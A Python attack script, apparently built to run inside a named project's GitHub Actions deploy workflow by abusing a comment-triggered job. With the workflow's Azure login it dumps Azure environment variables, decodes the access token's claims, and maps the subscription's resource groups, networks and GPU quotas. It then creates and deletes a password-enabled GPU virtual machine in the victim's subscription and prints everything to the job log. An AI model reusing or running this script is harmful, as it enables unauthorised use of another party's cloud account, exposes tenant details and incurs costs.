#!/usr/bin/env python3
"""C211 i120187 fork-controlled probe: runs after azure/login in vincentgiraud/demo-mlops
issue_comment '/deploy-prod' workflow. Read-only ARM enumeration first; deploys EXACTLY ONE
on-demand GPU VM only if a nonzero NC/ND/NV quota and usable existing RG/vnet are found,
captures nvidia-smi via runCommand, deletes it and proves absence."""
import argparse, json, os, random, string, subprocess, sys, time, urllib.request, urllib.error, urllib.parse

B = "C211_I120187"
def p(*a):
    print(*a, flush=True)

def sh(cmd, timeout=120):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {'cmd': cmd, 'rc': r.returncode, 'out': r.stdout[-8000:], 'err': r.stderr[-3000:]}
    except Exception as e:
        return {'cmd': cmd, 'rc': -1, 'err': repr(e)}

def jget(tok, url):
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-i120187'})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.status, json.loads(r.read() or b'{}')
    except urllib.error.HTTPError as e:
        body = e.read()[:1200].decode('utf8', 'replace')
        return e.code, {'error': body}
    except Exception as e:
        return -1, {'error': repr(e)}

def jcall(tok, method, url, body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method,
        headers={'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-i120187',
                 'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            try: return r.status, json.loads(raw or b'{}'), dict(r.headers)
            except Exception: return r.status, {'raw': raw[:800].decode('utf8','replace')}, dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read()[:1500].decode('utf8', 'replace')
        return e.code, {'error': body}, dict(e.headers)
    except Exception as e:
        return -1, {'error': repr(e)}, {}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--subscription-id'); ap.add_argument('--resource-group')
    ap.add_argument('--workspace'); ap.add_argument('--endpoint-name')
    ap.add_argument('--deployment-name')
    ap.parse_known_args()
    R = {'began': time.strftime('%FT%TZ', time.gmtime())}
    R['env_azure'] = {k: v for k, v in os.environ.items() if k.startswith('AZURE') or k.startswith('ARM_')}
    R['whoami'] = sh('az account show -o json 2>&1 || true')
    tokr = sh('az account get-access-token --resource https://management.azure.com/ -o json 2>&1', timeout=180)
    R['token_cmd'] = {'rc': tokr['rc'], 'err': tokr.get('err', '')[:800]}
    tok = None
    try:
        td = json.loads(tokr['out'])
        tok = td.get('accessToken')
        R['token_claims'] = td.get('accessToken') and json.loads(__import__('base64').urlsafe_b64decode(td['accessToken'].split('.')[1] + '===')) or None
        R['token_expiresOn'] = td.get('expiresOn'); R['token_subscription'] = td.get('subscription'); R['token_tenant'] = td.get('tenant')
    except Exception as e:
        R['token_parse_error'] = repr(e)
    if not tok:
        p(B + '_RESULT_BEGIN'); p(json.dumps(R)); p(B + '_RESULT_END'); return
    ARM = 'https://management.azure.com'
    st, subs = jget(tok, ARM + '/subscriptions?api-version=2022-12-01')
    R['subscriptions_status'] = st
    R['subscriptions'] = [{'id': s.get('subscriptionId'), 'state': s.get('state'), 'name': s.get('displayName')}
                          for s in (subs.get('value') or [])] if st == 200 else subs
    sub_ids = [s['id'] for s in R['subscriptions']] if isinstance(R['subscriptions'], list) else []
    if not sub_ids and R['env_azure'].get('AZURE_SUBSCRIPTION_ID'):
        sub_ids = [R['env_azure']['AZURE_SUBSCRIPTION_ID']]
    R['rg'] = {}; R['vnets'] = {}; R['quota_nonzero'] = []; R['skus_gpu'] = []
    GPU_HINTS = ('NC', 'ND', 'NV', 'GPU')
    for sub in sub_ids[:3]:
        st, rgs = jget(tok, f'{ARM}/subscriptions/{sub}/resourcegroups?api-version=2021-04-01')
        R['rg'][sub] = {'status': st, 'names': [g['name'] for g in (rgs.get('value') or [])] if st == 200 else rgs}
        R['vnets'][sub] = {}
        for rgname in (R['rg'][sub]['names'] if st == 200 else [])[:40]:
            stv, vn = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{rgname}/providers/Microsoft.Network/virtualNetworks?api-version=2024-01-01')
            if stv == 200 and vn.get('value'):
                R['vnets'][sub][rgname] = {'status': stv, 'vnets': [
                    {'name': v.get('name'), 'location': v.get('location'),
                     'subnets': [{'name': sn.get('name'), 'prefix': (sn.get('properties') or {}).get('addressPrefix')}
                                 for sn in (v.get('properties') or {}).get('subnets', [])]}
                    for v in vn['value']]}
        st, locs = jget(tok, f'{ARM}/subscriptions/{sub}/locations?api-version=2022-12-01')
        regions = [l['name'] for l in (locs.get('value') or [])] if st == 200 else []
        R.setdefault('regions_status', {})[sub] = {'status': st, 'count': len(regions)}
        for reg in regions[:70]:
            stu, us = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/usages?api-version=2024-07-01')
            if stu != 200: continue
            for u in us.get('value') or []:
                nm = u.get('name', {}).get('value', '') or ''
                cur, lim = u.get('currentValue', 0), u.get('limit', 0)
                if any(h in nm.upper() for h in GPU_HINTS) and lim and (lim - cur) > 0:
                    R['quota_nonzero'].append({'sub': sub, 'region': reg, 'family': nm, 'current': cur, 'limit': lim})
        # skus: query per region with a bounded filter
        for reg in regions[:70]:
            stu, sk = jget(tok, f"{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/skus?api-version=2021-07-01&$filter=" + urllib.parse.quote(f"location eq '{reg}'"))
            if stu != 200: continue
            for s in sk.get('value') or []:
                nm = s.get('name', '')
                if not (nm.startswith('Standard_NC') or nm.startswith('Standard_ND') or nm.startswith('Standard_NV')): continue
                restrictions = [r for r in (s.get('restrictions') or []) if r.get('type') == 'Location']
                if restrictions: continue
                caps = {c.get('name'): c.get('value') for c in (s.get('capabilities') or [])}
                R['skus_gpu'].append({'sub': sub, 'region': reg, 'sku': nm, 'family': s.get('family'),
                                      'vcpus': caps.get('vCPUs'), 'gpus': caps.get('GPUs'),
                                      'gpu_name': caps.get('GPU'), 'memoryGB': caps.get('MemoryGB')})
    # ---- deployment decision ----
    R['marker'] = {'attempted': False}
    def region_of(rg, sub):
        for v in (R['vnets'].get(sub, {}).get(rg, {}) or {}).get('vnets', []) or []:
            if v.get('subnets'):
                return v.get('location'), v['name'], v['subnets'][0]
        return None
    def pick():
        # Prefer an existing vnet+subnet whose region has nonzero quota and a matching offered SKU
        qregions = {(q['sub'], q['region']) for q in R['quota_nonzero']}
        for sub in sub_ids[:3]:
            for rg in (R['rg'][sub]['names'] if R['rg'][sub]['status'] == 200 else []):
                info = region_of(rg, sub)
                if not info: continue
                region, vnet, subnet = info
                if (sub, region) not in qregions: continue
                cand = [s for s in R['skus_gpu'] if s['sub'] == sub and s['region'] == region]
                if not cand: continue
                cand.sort(key=lambda s: (int(s.get('vcpus') or 999), s['sku']))
                return sub, rg, region, vnet, subnet, cand[0]
        return None
    sel = pick()
    R['marker']['selection'] = sel and {'sub': sel[0], 'rg': sel[1], 'region': sel[2], 'vnet': sel[3], 'subnet': sel[4], 'sku': sel[5]['sku']}
    if sel and os.environ.get('C211_SKIP_DEPLOY') != '1':
        sub, rg, region, vnet, subnet, sku = sel
        R['marker']['attempted'] = True
        nonce = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
        vm = 'c211-i120187-' + nonce
        nic = vm + '-nic'
        subid = subnet.get('prefix')
        # find subnet resource id
        subnet_id = None
        stv, vn = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
        for sn in ((vn.get('properties') or {}).get('subnets') or []):
            if sn.get('name') == subnet.get('name'):
                subnet_id = sn.get('id')
        R['marker'].update({'vm': vm, 'nic': nic, 'region': region, 'subnet_id': subnet_id})
        if not subnet_id:
            R['marker']['error'] = 'no_subnet_id'
        else:
            nicbody = {'location': region, 'tags': {'c211': 'i120187', 'nonce': nonce},
                       'properties': {'ipConfigurations': [{'name': 'ipcfg', 'properties': {
                           'privateIPAllocationMethod': 'Dynamic',
                           'subnet': {'id': subnet_id}}}]}}
            st, resp, _ = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01', nicbody)
            R['marker']['nic_create'] = {'status': st, 'resp': resp if st not in (200, 201) else {'id': resp.get('id')}}
            pw = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(24)) + '!aA1'
            vmbody = {
                'location': region, 'tags': {'c211': 'i120187', 'nonce': nonce},
                'properties': {
                    'hardwareProfile': {'vmSize': sku},
                    'storageProfile': {'imageReference': {'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy', 'sku': '22_04-lts-gen2', 'version': 'latest'},
                                       'osDisk': {'createOption': 'FromImage', 'managedDisk': {'storageAccountType': 'Standard_LRS'}, 'deleteOption': 'Delete'}},
                    'osProfile': {'computerName': vm[:15], 'adminUsername': 'c211probe', 'adminPassword': pw,
                                  'linuxConfiguration': {'disablePasswordAuthentication': False}},
                    'networkProfile': {'networkInterfaces': [{'id': resp.get('id'), 'properties': {'deleteOption': 'Delete'}}]}}}
            if not vmbody['properties']['networkProfile']['networkInterfaces'][0]['id']:
                vmbody['properties']['networkProfile']['networkInterfaces'][0]['id'] = f'{ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Network/networkInterfaces/{nic}'
            st, resp, _ = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01', vmbody)
            R['marker']['vm_create'] = {'status': st, 'resp': resp if st not in (200, 201) else {'id': resp.get('id'), 'name': resp.get('name')}}
            if st in (200, 201):
                ok = False
                for i in range(60):
                    time.sleep(10)
                    stg, g = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01&$expand=instanceView')
                    prov = ((g.get('properties') or {}).get('provisioningState'))
                    R['marker'].setdefault('poll', []).append({'i': i, 'status': stg, 'state': prov})
                    if prov in ('Succeeded', 'Failed'): ok = prov == 'Succeeded'; break
                R['marker']['provisioned'] = ok
                if ok:
                    rc_body = {'commandId': 'RunShellScript', 'script': ['nvidia-smi -L; echo ---; nvidia-smi --query-gpu=name,uuid,driver_version --format=csv']}
                    st, resp, hdr = jcall(tok, 'POST', f'{ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}/runCommand?api-version=2024-07-01', rc_body)
                    R['marker']['runcommand_submit'] = {'status': st, 'headers': {k: v for k, v in hdr.items() if k.lower() in ('location', 'azure-asyncoperation')}}
                    pollurl = hdr.get('Azure-AsyncOperation') or hdr.get('azure-asyncoperation') or hdr.get('Location') or hdr.get('location')
                    captured = None
                    if pollurl:
                        for i in range(40):
                            time.sleep(8)
                            stu2, st2 = jget(tok, pollurl if pollurl.startswith('http') else ARM + pollurl)
                            sval = st2.get('status') or ((st2.get('properties') or {}).get('provisioningState'))
                            if sval in ('Succeeded', 'Failed'):
                                captured = st2
                                break
                    R['marker']['runcommand_result'] = captured
                    out = json.dumps(captured or {})
                    R['marker']['device_proof'] = [ln for ln in out.split('\\n') if 'GPU-' in ln or 'Tesla' in ln or 'NVIDIA' in ln][:6]
                # cleanup
                std, rd, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
                R['marker']['vm_delete_status'] = std
                for i in range(30):
                    time.sleep(6)
                    stl, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
                    if stl == 404: break
                R['marker']['vm_absence_status'] = stl
                stn, rn, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01')
                R['marker']['nic_delete_status'] = stn
                stlist, lst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01')
                R['marker']['list_after'] = {'status': stlist, 'names': [v.get('name') for v in (lst.get('value') or [])] if stlist == 200 else lst}
    R['finished'] = time.strftime('%FT%TZ', time.gmtime())
    p(B + '_RESULT_BEGIN'); p(json.dumps(R)); p(B + '_RESULT_END')

if __name__ == '__main__':
    main()
